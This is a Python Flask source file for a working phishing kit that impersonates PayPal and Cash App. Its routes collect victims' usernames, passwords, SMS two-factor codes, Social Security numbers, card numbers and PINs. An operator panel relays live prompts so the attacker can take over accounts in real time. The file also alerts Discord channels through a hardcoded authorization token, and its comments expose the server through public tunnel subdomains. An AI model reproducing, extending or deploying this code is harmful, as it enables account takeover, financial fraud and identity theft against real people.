import linecache
import random
import requests
import time
from textwrap import wrap
from flask import Flask, render_template, redirect, url_for, request
from multiprocessing import Process
import app as application
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options as ChromeOptions
import requests
import textwrap
import pickle
import os
import threading
from flask_sslify import SSLify
from datetime import date
import pyperclip
from playsound import playsound

from pyngrok import ngrok
from flask_ngrok import run_with_ngrok





delay = 19
app = Flask(__name__)
sslify = SSLify(app)


GOON = {
    "content" : "NIEUWE INLOG MET EMAIL, KIJK SNEL PANEEEL"
}
SMS = {
    "content" : "NIEUWE SMS CODE, KIJK SNEL PANEEEL"
}

header = {
    'authorization': 'OTI3NTg0NzAwOTU0OTc2Mjg2.GXJ1Zk.xx4RexVa8-lgWyAZ-qbr3caYmrCdDK-4osMo_w'
}

#run_with_ngrok(app)


def paypal_login():
    r = requests.post("https://discord.com/api/v9/channels/969752367278985226/messages", data=GOON, headers=header)
    r = requests.post("https://discord.com/api/v9/channels/938168006851317780/messages", data=GOON, headers=header)
    pwd = request.form['wachtwoord']
    usr = request.form['gebruikersnaam']
    f = open("panelvalues/paypal_login", "w")
    f.write(usr+":"+pwd)
    f.close()
    f = open("panelvalues/input_paypal_login", "w")
    f.write("GOAT")
    f.close()
    before = open("panelvalues/input_paypal_login", "r").read()
    while before == open("panelvalues/input_paypal_login", "r").read():
        print("ESKETIT")
    print(open("panelvalues/input_paypal_login", "r").read())
    if open("panelvalues/input_paypal_login", "r").read() == "SMS":
        return "sms"
    elif open("panelvalues/input_paypal_login", "r").read() == "APP":
        return "app"
    elif open("panelvalues/input_paypal_login", "r").read() == "WRONG":
        return "wrong"
    elif open("panelvalues/input_paypal_login", "r").read() == "ATTEMPT":
        return "attempt"

def paypal_2fa_choice(button_xpath):
    pass  # enter 2fa


def paypal_2fa_enter():
    r = requests.post("https://discord.com/api/v9/channels/969752367278985226/messages", data=SMS, headers=header)
    r = requests.post("https://discord.com/api/v9/channels/938168006851317780/messages", data=SMS, headers=header)
    n1=request.form["ist"]
    n2=request.form["sec"]
    n3=request.form["third"]
    n4=request.form["fourth"]
    n5=request.form["fifth"]
    n6=request.form["sixth"]
    f = open("panelvalues/smscode", "w")
    f.write(str(n1)+str(n2)+str(n3)+str(n4)+str(n5)+str(n6))
    f.close()
    f = open("panelvalues/input_paypal_login", "w")
    f.write("GOAT")
    f.close()
    before = open("panelvalues/input_paypal_login", "r").read()
    while before == open("panelvalues/input_paypal_login", "r").read():
        print("ESKETIT")
    if open("panelvalues/input_paypal_login", "r").read() == "GOOD":
        return True
    elif open("panelvalues/input_paypal_login", "r").read() == "WRONG":
        return False


def cashapplogin():
    usr = request.form['usr']
    print(usr)
    pyperclip.copy(usr)
    code = input("1 = good 2 = bad 3=fullphone")
    if code == "1":
        return True
    elif code == "2":
        return False
    elif code == "3":
        return "phone"


def cashappcodefillin():
    code = request.form['code']
    print(code)
    pyperclip.copy(code)
    code = input("1 = card 2 = ssn 3=pin 4=phone 5= false")
    if code == "1":
        return "card"
    elif code == "2":
        return "SSN"
    elif code == "3":
        return "pin"
    elif code == "4":
        return "phone"
    elif code == "5":
        return False

def cashappssnauth():
    usr = request.form["ssn"]
    print(usr)
    code = input("1 = good 2 = bad")
    if code == "1":
        return True
    elif code == "2":
        return False

def cashappcardauth():
    usr = request.form["card"]
    print(usr)
    code = input("1 = good 2 = bad")
    if code == "1":
        return True
    elif code == "2":
        return False

def cashapppinfillin():
    n1=request.form["ist"]
    n2=request.form["sec"]
    n3=request.form["third"]
    n4=request.form["fourth"]
    print(n1)
    print(n2)
    print(n4)
    print(n4)
    code = input("1 = good 2 = bad")
    if code == "1":
        cookies = r'D:\Pyhton\Anacond\panel\cashapplogins'
        count = 0
        for path in os.listdir(cookies):
            # check if current path is a file
            if os.path.isfile(os.path.join(cookies, path)):
                count += 1
        count += 1
        f = open(f"cashapplogins/{count}.txt", "a")
        f.write(str(n1) + str(n2) + str(n3) + str(n4)+"\n")
        f.close()
        return True
    elif code == "2":
        return False

def cashapppphonecode():
    code = request.form['code']
    print(code)
    pyperclip.copy(code)
    code = input("1 = card 2 = ssn 3=pin 4=phone 5= false")
    if code == "1":
        return "card"
    elif code == "2":
        return "SSN"
    elif code == "3":
        return "pin"
    elif code == "4":
        return "phone"
    elif code == "5":
        return False

def cashapppphonenumber():
    usr = request.form['usr']
    print(usr)
    pyperclip.copy(usr)
    code = input("1 = card 2 = ssn 3=pin 4=phone 5= false")
    if code == "1":
        return "card"
    elif code == "2":
        return "SSN"
    elif code == "3":
        return "pin"
    elif code == "4":
        return "phone"
    elif code == "5":
        return False




@app.route("/cashapp/pin", methods=["POST", "GET"])
def cashapppin():
    if request.method == "POST":
        try:
            ret = cashapppinfillin()
            if ret == False:
                return render_template('cashapp/pinfalse.html')
            elif ret == True:
                return render_template('cashapp/payment.html')
        except: pass
    return render_template('cashapp/pin.html')

@app.route("/cashapp/phone", methods=["POST", "GET"])
def cashappphone():
    if request.method == "POST":
        try:
            ret = cashapppphonecode()
            if ret == False:
                return render_template('cashapp/phonefalse.html')
            elif ret == "SSN":
                return redirect('/cashapp/ssn')
            elif ret == "card":
                return redirect('/cashapp/card')
            elif ret == "pin":
                return redirect('/cashapp/pin')
            elif ret == "phone":
                return redirect('/cashapp/phone')
        except: pass
    return render_template('cashapp/phone.html')


@app.route("/cashapp/fullphone", methods=["POST", "GET"])
def cashappfullphone():
    if request.method == "POST":
        try:
            ret = cashapppphonenumber()
            if ret == False:
                return render_template('cashapp/phonenumberfalse.html')
            elif ret == "SSN":
                return redirect('/cashapp/ssn')
            elif ret == "card":
                return redirect('/cashapp/card')
            elif ret == "pin":
                return redirect('/cashapp/pin')
            elif ret == "phone":
                return redirect('/cashapp/phone')
        except: pass
    return render_template('cashapp/phonenumber.html')

@app.route("/cashapp/signincode", methods=["POST", "GET"])
def cashappcode():
    if request.method == "POST":
        try:
            ret =cashappcodefillin()
            if ret == "SSN":
                return redirect('/cashapp/ssn')
            elif ret == "card":
                return redirect('/cashapp/card')
            elif ret == "pin":
                return redirect('/cashapp/pin')
            elif ret == "phone":
                return redirect('/cashapp/phone')
            elif ret == False:
                return render_template('cashapp/codefalse.html')
        except: pass
    return render_template('cashapp/code.html')

@app.route("/cashapp/ssn", methods=["POST", "GET"])
def cashappssn():
    if request.method == "POST":
        try:
            ret = cashappssnauth()
            if ret == True:
                return redirect('/cashapp/pin')
            elif ret == False:
                return render_template('cashapp/ssnfalse.html')
        except:
            return render_template('cashapp/ssn.html')
    return render_template('cashapp/ssn.html')


@app.route("/cashapp/card", methods=["POST", "GET"])
def cashappcard():
    if request.method == "POST":
        try:
            ret = cashappcardauth()
            if ret == True:
                return redirect('/cashapp/pin')
            elif ret == False:
                return render_template('cashapp/cardfalse.html')
        except:
            return render_template('cashapp/card.html')
    return render_template('cashapp/card.html')


@app.route("/cashapp", methods=["POST", "GET"])
def cashapp():
    if request.method == "POST":
        try:
            ret = cashapplogin()
            if ret == True:
                return redirect('/cashapp/signincode')
            elif ret == "phone":
                return redirect('/cashapp/fullphone')
            else:
                return render_template('cashapp/indexfalse.html')
        except: pass
    return render_template('cashapp/index.html')  # CHANGE




@app.route("/paypal/sms_auth", methods=["POST", "GET"])
def paypal_sms():
    if request.method == "POST":
        try:
            ret =paypal_2fa_enter()
            if ret == False:
                return redirect("/paypal/sms_auth")
            elif ret == True:
                return redirect("/paypal/completed")
        except:
            pass
    return render_template('paypal/2faphone.html')  # CHANGE



@app.route("/paypal/app_auth", methods=["POST", "GET"])
def paypal_app():
    return render_template('paypal/2fa.html')

@app.route("/paypal/completed", methods=["POST", "GET"])
def paypal_sent():
    return render_template('paypal/send.html')



@app.route("/paypal", methods=["POST", "GET"])
def home():
    if request.method == "POST":
        try:
            ret = paypal_login()
            if ret == "wrong":
                return render_template('paypal/wrongpwd.html')
            elif ret == "app":
                return redirect("/paypal/app_auth")
            elif ret == "sms":
                return redirect("/paypal/sms_auth")
            elif ret == "attempt":
                return render_template('paypal/failedattempts.html')
        except:
            return render_template('paypal/wrongpwd.html')
    return render_template('paypal/index.html')


@app.route("/", methods=["POST", "GET"])
def homepage():
    if request.method == "POST":
        print("NEW VISITOR")
        #payload = {'content': "NEW VISITOR"}
        #requests.post("https://discord.com/api/v9/channels/1021419448676139161/messages", data=payload, headers=header)
        return redirect("/paypal")
    return render_template('start/index2.html')  # CHANGE

@app.route("/panel/sms", methods=["POST", "GET"])
def panelsms():
    if request.method == "POST":
        if request.form['submit'] == 'GOOD':
            f = open("panelvalues/input_paypal_login", "w")
            f.write("GOOD")
            f.close()
        elif request.form['submit'] == 'WRONG':
            f = open("panelvalues/input_paypal_login", "w")
            f.write("WRONG")
            f.close()
    try:
        f = open("panelvalues/smscode", "r")
        combo = f.read()
        return render_template('panel/panelsms.html', code=combo)  # CHANGE
    except:
        return render_template('panel/panelsms.html', code="user")


@app.route("/panel", methods=["POST", "GET"])
def panel():
    if request.method == "POST":
        print("NEW VISITOR")
        if request.form['submit'] == 'SMS':
            f = open("panelvalues/input_paypal_login", "w")
            f.write("SMS")
            f.close()
            return redirect("/panel/sms")
        elif request.form['submit'] == 'APP':
            f = open("panelvalues/input_paypal_login", "w")
            f.write("APP")
            f.close()
            return redirect("/panel")
        elif request.form['submit'] == 'WRONG':
            f = open("panelvalues/input_paypal_login", "w")
            f.write("WRONG")
            f.close()
            return redirect("/panel")
        elif request.form['submit'] == 'ATTEMPT':
            f = open("panelvalues/input_paypal_login", "w")
            f.write("ATTEMPT")
            f.close()
            return redirect("/panel")
    try:
        f = open("panelvalues/paypal_login", "r")
        combo = f.read()
        return render_template('panel/panel.html', user=combo.split(":")[0], passw=combo.split(":")[1])  # CHANGE
    except:
        return render_template('panel/panel.html', user="user", passw="erik")

#lt --port 5000 --subdomain megasupplier
#lt --port 5000 --subdomain verylegalmegas

if __name__ == "__main__":
    app.run(debug=True)